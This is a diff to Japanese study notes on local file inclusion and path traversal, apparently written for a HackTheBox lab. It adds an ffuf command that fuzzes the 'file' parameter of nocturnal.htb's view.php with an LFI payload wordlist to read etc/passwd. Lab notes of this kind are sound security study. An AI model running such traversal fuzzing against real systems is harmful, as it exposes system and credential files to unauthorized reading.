@@ -5,6 +5,9 @@
 - URLのクエリ文字とフォーム本文を調べるところから始める。
 	↑さらにファイル参照を含む箇所を探す。
 - 探索する際に一般的に使用されるファイル
+```sh
+ffuf -H "Cookie: PHPSESSID=jvjrluq9mao70i7j4upomht27v" -u http://nocturnal.htb/view.php -data "username=hoge&file=FUZZetc/passwd" -w /opt/work/WordLists/PayloadsAllTheThings/File\ Inclusion/Intruders/dot-slash-PathTraversal_and_LFI_pairing.txt:FUZZ -fw 1170 -x http://127.0.0.1:8080
+```
 
 ### ### LFI
 ### ### 以下のPHPコードがあった場合にLFIの脆弱性がある。
